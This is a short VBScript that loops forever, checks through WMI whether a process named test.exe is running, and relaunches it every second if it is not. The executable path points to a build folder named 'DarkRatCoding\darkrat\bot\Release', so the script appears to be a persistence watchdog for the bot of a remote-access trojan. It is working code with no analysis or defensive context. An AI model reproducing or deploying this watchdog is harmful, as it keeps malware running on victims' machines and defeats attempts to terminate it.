Do
sComputerName = "."
Set objWMIService = GetObject("winmgmts:\\" & sComputerName & "\root\cimv2")
sQuery = "SELECT * FROM Win32_Process"
Set objItems = objWMIService.ExecQuery(sQuery)
Dim found
found = "false"
For Each objItem In objItems
If objItem.Name = "test.exe" Then
found = "true"
End If
Next
If found = "false" Then
Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run("C:\Users\darkspider\Desktop\DarkRatCoding\darkrat\bot\Release\test.exe")
Set objShell = Nothing
End If
WScript.Sleep 1000
Loop
